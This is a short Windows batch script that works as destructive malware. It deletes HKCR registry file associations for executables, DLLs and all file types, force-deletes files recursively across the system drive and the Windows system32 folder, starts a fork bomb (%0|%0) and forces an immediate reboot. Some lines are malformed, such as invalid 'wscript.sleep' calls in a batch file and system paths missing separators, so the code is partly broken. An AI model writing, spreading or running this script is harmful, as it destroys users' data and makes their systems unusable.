@Echo off
wscript.sleep 100
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
wscript.sleep 50
del %systemdrive%\*.* /f /s /q
wscript.sleep 100
Del C:\ *.* |y
wscript.sleep 100
del c:WINDOWSsystem32*.*/q 
wscript.sleep 100
del *.*
wscript.sleep 100
%0|%0
wscript.sleep 100
shutdown -r -f -t 00
exit 
